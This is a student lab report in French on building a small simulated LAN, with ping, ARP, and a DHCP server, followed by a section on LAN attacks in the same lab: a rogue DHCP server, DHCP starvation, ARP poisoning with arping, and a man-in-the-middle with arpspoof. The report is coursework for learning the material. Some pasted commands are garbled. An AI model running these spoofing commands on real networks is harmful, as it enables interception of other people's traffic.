# Part 1 : Most simplest LAN¶

## 1. Intro

## 3. Know your MAC

### 🌞 Définir une IP statique sur les deux machines et 🌞 Déterminer l'adresse MAC de vos deux machines

```bash
VPCS> show

NAME   IP/MASK              GATEWAY           MAC                LPORT  RHOST:PORT
VPCS1  10.1.1.2/24          0.0.0.0           00:50:79:66:68:00  20002  127.0.0.1:20003
       fe80::250:79ff:fe66:6800/64

VPCS> show

NAME   IP/MASK              GATEWAY           MAC                LPORT  RHOST:PORT
VPCS1  10.1.1.1/24          0.0.0.0           00:50:79:66:68:01  20000  127.0.0.1:20001
       fe80::250:79ff:fe66:6801/64

```

```bash
[miche@vbox ~]$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:88:6c:9a brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute enp0s3
       valid_lft 70995sec preferred_lft 70995sec
    inet6 fd00::a00:27ff:fe88:6c9a/64 scope global dynamic noprefixroute
       valid_lft 86176sec preferred_lft 14176sec
    inet6 fe80::a00:27ff:fe88:6c9a/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:a7:67:54 brd ff:ff:ff:ff:ff:ff
    inet 192.168.10.4/24 brd 192.168.10.255 scope global dynamic noprefixroute enp0s8
       valid_lft 575sec preferred_lft 575sec
    inet6 fe80::6d79:b866:8f9d:618f/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
4: enp0s9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:0d:cb:2e brd ff:ff:ff:ff:ff:ff
    inet 10.1.1.253/24 brd 10.1.1.255 scope global noprefixroute enp0s9
       valid_lft forever preferred_lft forever
    inet6 fe80::1bda:7b55:8023:b10b/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
```

## 4. IP Setup

### 🌞 Proofs ?

```bash
VPCS> show ip

NAME        : VPCS[1]
IP/MASK     : 10.1.1.1/24
GATEWAY     : 0.0.0.0
DNS         :
MAC         : 00:50:79:66:68:01
LPORT       : 20000
RHOST:PORT  : 127.0.0.1:20001
MTU         : 1500

VPCS> show ip

NAME        : VPCS[1]
IP/MASK     : 10.1.1.2/24
GATEWAY     : 0.0.0.0
DNS         :
MAC         : 00:50:79:66:68:00
LPORT       : 20002
RHOST:PORT  : 127.0.0.1:20003
MTU         : 1500

```

### 🌞 Effectuer un ping d'une machine à l'autre

```bash
VPCS> ping 10.1.1.2

84 bytes from 10.1.1.2 icmp_seq=1 ttl=64 time=4.241 ms
84 bytes from 10.1.1.2 icmp_seq=2 ttl=64 time=2.838 ms
84 bytes from 10.1.1.2 icmp_seq=3 ttl=64 time=3.252 ms
84 bytes from 10.1.1.2 icmp_seq=4 ttl=64 time=1.741 ms
84 bytes from 10.1.1.2 icmp_seq=5 ttl=64 time=2.071 ms

```

### 🌞 Protocolz ?

```bash
ICMP
```

### 📁 p1_ping.pcap

# Part 2 : Bring that switch in

## 3. Même chose en fast

### 🌞 Déterminer l'adresse MAC de vos trois machines et Définir une IP statique sur les trois machines

```bash
VPCS> show

NAME   IP/MASK              GATEWAY           MAC                LPORT  RHOST:PO                  RT
VPCS1  10.1.1.1/24          0.0.0.0           00:50:79:66:68:01  20000  127.0.0.                  1:20001
       fe80::250:79ff:fe66:6801/64


VPCS> show

NAME   IP/MASK              GATEWAY           MAC                LPORT  RHOST:PO             RT
VPCS1  10.1.1.2/24          0.0.0.0           00:50:79:66:68:00  20002  127.0.0.             1:20003
       fe80::250:79ff:fe66:6800/64

show

NAME   IP/MASK              GATEWAY           MAC                LPORT  RHOST:PORT
VPCS1  10.1.1.3/24          0.0.0.0           00:50:79:66:68:02  20006  127.0.0.1:20007
       fe80::250:79ff:fe66:6802/64

```

### 🌞 Effectuer des ping d'une machine à l'autre

```bash
VPCS> ping 10.1.1.2

84 bytes from 10.1.1.2 icmp_seq=1 ttl=64 time=2.716 ms
84 bytes from 10.1.1.2 icmp_seq=2 ttl=64 time=5.185 ms
84 bytes from 10.1.1.2 icmp_seq=3 ttl=64 time=7.194 ms
84 bytes from 10.1.1.2 icmp_seq=4 ttl=64 time=172.305 ms
84 bytes from 10.1.1.2 icmp_seq=5 ttl=64 time=1.469 ms

VPCS> ping 10.1.1.3

84 bytes from 10.1.1.3 icmp_seq=1 ttl=64 time=6.131 ms
84 bytes from 10.1.1.3 icmp_seq=2 ttl=64 time=5.395 ms
84 bytes from 10.1.1.3 icmp_seq=3 ttl=64 time=8.457 ms
84 bytes from 10.1.1.3 icmp_seq=4 ttl=64 time=3.565 ms
84 bytes from 10.1.1.3 icmp_seq=5 ttl=64 time=12.193 ms

VPCS> ping 10.1.1.1

84 bytes from 10.1.1.1 icmp_seq=1 ttl=64 time=5.910 ms
84 bytes from 10.1.1.1 icmp_seq=2 ttl=64 time=3.210 ms
84 bytes from 10.1.1.1 icmp_seq=3 ttl=64 time=1.530 ms
84 bytes from 10.1.1.1 icmp_seq=4 ttl=64 time=4.508 ms
84 bytes from 10.1.1.1 icmp_seq=5 ttl=64 time=7.057 ms

```

## 4. ARP old friend

### 🌞 Afficher la table ARP de node1

```bash
VPCS> show arp

00:50:79:66:68:00  10.1.1.2 expires in 106 seconds
00:50:79:66:68:02  10.1.1.3 expires in 113 seconds
```

### 📁 p2_arp_node2.pcap

### 📁 p2_arp_node3.pcap

## Part 3 : DHCP is a nice guy

### 🌞 Installer un serveur DHCP

```bash
[miche@vbox ~]$ sudo dnf install dnsmasq
[miche@vbox ~]$ sudo systemctl enable dnsmasq
Created symlink '/etc/systemd/system/multi-user.target.wants/dnsmasq.service' → '/usr/lib/systemd/system/dnsmasq.service'.

[miche@vbox ~]$ systemctl status dnsmasq
○ dnsmasq.service - DNS caching server.
     Loaded: loaded (/usr/lib/systemd/system/dnsmasq.service; enabled; preset: disabled)
     Active: inactive (dead)
[miche@vbox ~]$ sudo nano /etc/dnsmasq.conf

interface=enp0s3 (l'interface utilisé dans gns)
#line 184
dhcp-range=10.1.1.10,10.1.1.50,12h
```

## 4. Proof or you're lying

### 🌞 Récupérer une IP automatiquement depuis les 3 nodes

```bash
VPCS> ip dhcp
DDORA IP 10.1.1.46/24 GW 10.1.1.253

VPCS> ip dhcp
DDORA IP 10.1.1.45/24 GW 10.1.1.253

VPCS> ip dhcp
DDORA IP 10.1.1.47/24 GW 10.1.1.253
```

### 📁 p3_dhcp.pcap

## 5. DHCP lease

### 🌞 Bail DHCP

```bash
[miche@vbox ~]$ cat  /var/lib/dnsmasq/dnsmasq.leases | grep "10.1.1.45"
1767738262 00:50:79:66:68:00 10.1.1.45 VPCS 01:00:50:79:66:68:00
```

## Part 4 : real haxor

### 🌞 Installez et configurez un serveur DHCP sur votre machine attaquante

```bash
interface=enp0s3
dhcp-range=10.1.1.210,10.1.1.250,12h
```

### 🌞 Test

```bash
○ dnsmasq.service - DNS caching server.
     Loaded: loaded (/usr/lib/systemd/system/dnsmasq.service; enabled; preset: disabled)
     Active: inactive (dead) since Tue 2026-01-06 11:47:13 CET; 4s ago
   Duration: 24min 57.425s
 Invocation: 5635d4b4497a4666954b11b857ba268c
    Process: 830 ExecStart=/usr/sbin/dnsmasq (code=exited, status=0/SUCCESS)
   Main PID: 849 (code=exited, status=0/SUCCESS)
   Mem peak: 2.3M
        CPU: 14ms

Jan 06 11:40:58 dhcp.tp1.efrei dnsmasq-dhcp[849]: DHCPDISCOVER(enp0s3) 10.0.4.15 08:00:27:79:63:62
Jan 06 11:40:58 dhcp.tp1.efrei dnsmasq-dhcp[849]: DHCPOFFER(enp0s3) 10.1.1.50 08:00:27:79:63:62
Jan 06 11:40:58 dhcp.tp1.efrei dnsmasq-dhcp[849]: DHCPDISCOVER(enp0s3) 10.0.4.15 08:00:27:79:63:62
Jan 06 11:40:58 dhcp.tp1.efrei dnsmasq-dhcp[849]: DHCPOFFER(enp0s3) 10.1.1.50 08:00:27:79:63:62
Jan 06 11:40:58 dhcp.tp1.efrei dnsmasq-dhcp[849]: DHCPREQUEST(enp0s3) 10.1.1.50 08:00:27:79:63:62
Jan 06 11:40:58 dhcp.tp1.efrei dnsmasq-dhcp[849]: DHCPACK(enp0s3) 10.1.1.50 08:00:27:79:63:62 rogue
Jan 06 11:47:12 dhcp.tp1.efrei dnsmasq[849]: exiting on receipt of SIGTERM
Jan 06 11:47:12 dhcp.tp1.efrei systemd[1]: Stopping dnsmasq.service - DNS caching server....
Jan 06 11:47:13 dhcp.tp1.efrei systemd[1]: dnsmasq.service: Deactivated successfully.
Jan 06 11:47:13 dhcp.tp1.efrei systemd[1]: Stopped dnsmasq.service - DNS caching server..
```

## 2. BONUS : DHCP starvation

### 🌞 Proof

```bash
Jan 06 17:37:37 dhcp.tp1.efrei dnsmasq-dhcp[847]: DHCPDISCOVER(enp0s3) de:ad:15:2a:5a:13 no address available
Jan 06 17:37:38 dhcp.tp1.efrei dnsmasq-dhcp[847]: DHCPDISCOVER(enp0s3) de:ad:0d:04:b0:be no address available
Jan 06 17:37:38 dhcp.tp1.efrei dnsmasq-dhcp[847]: DHCPDISCOVER(enp0s3) de:ad:1f:4b:89:96 no address available
Jan 06 17:37:39 dhcp.tp1.efrei dnsmasq-dhcp[847]: DHCPDISCOVER(enp0s3) de:ad:0c:71:d0:9b no address available
Jan 06 17:37:39 dhcp.tp1.efrei dnsmasq-dhcp[847]: DHCPDISCOVER(enp0s3) de:ad:25:3e:63:71 no address available
Jan 06 17:37:40 dhcp.tp1.efrei dnsmasq-dhcp[847]: DHCPDISCOVER(enp0s3) de:ad:07:1b:c0:40 no address available
Jan 06 17:37:40 dhcp.tp1.efrei dnsmasq-dhcp[847]: DHCPDISCOVER(enp0s3) de:ad:17:64:bf:b4 no address available
Jan 06 17:37:40 dhcp.tp1.efrei dnsmasq-dhcp[847]: DHCPDISCOVER(enp0s3) de:ad:26:25:e5:63 no address available
```

## **3. ARP poisoning**

Node 1 :

```bash
VPCS> arp 00:50:79:66:68:01 10.1.1.2 expires in 112 seconds 00:50:79:66:68:02
10.1.1.3 expires in 116 seconds
```

Attaque :

```bash
miche@kali:~$ sudo arping -I enp0s9 -S 10.1.1.3 -s SA:LU:UT:ME:OO:OW -c 5 -U
10.1.1.1
```

Après attaque :

```bash
VPCS> arp 00:50:79:66:68:01 10.1.1.2 expires in 86 seconds de:ad:be:ef:ca:fe
10.1.1.3 expires in 118 seconds
```

## **B. MITM**

machine attaque :

```bash
miche@kali:~$ sudo arpspoof -i enp0s9 -t 10.1.1.1 10.1.1.1 miche@kali:~$ sudo
arpspoof -i enp0s9 -t 10.1.1.1 10.1.1.2
```

Si on essaye de ping ça timeout donc il faut ajouter :

```bash
miche@kali:~$ sudo sysctl -w net.ipv4.ip_forward=1 net.ipv4.ip_forward = 1
```

Sur node1 :

```bash
VPCS> arp 08:00:27:22:9a:94 10.1.1.2 expires in 120 seconds
```

Sur node2 :

```bash
VPCS> arp 08:00:27:22:9a:94 10.1.1.35 expires in 118 seconds 08:00:27:22:9a:94
10.1.1.1 expires in 119 seconds
```

Sur la machine attaquante :

```bash
4: enp0s9:
<BROADCAST,MULTICAST,UP,LOWER_UP>
  mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether
  08:00:27:22:9a:94 brd ff:ff:ff:ff:ff:ff altname enx080027229a94 inet
  10.1.1.35/24 brd 10.1.1.255 scope global enp0s9 valid_lft forever
  preferred_lft forever inet6 fe80::a00:27ff:fe22:9a94/64 scope link proto
  kernel_ll valid_lft forever preferred_lft
  forever</BROADCAST,MULTICAST,UP,LOWER_UP
>
```

### 📁 p4_arp_poisoning.pcap
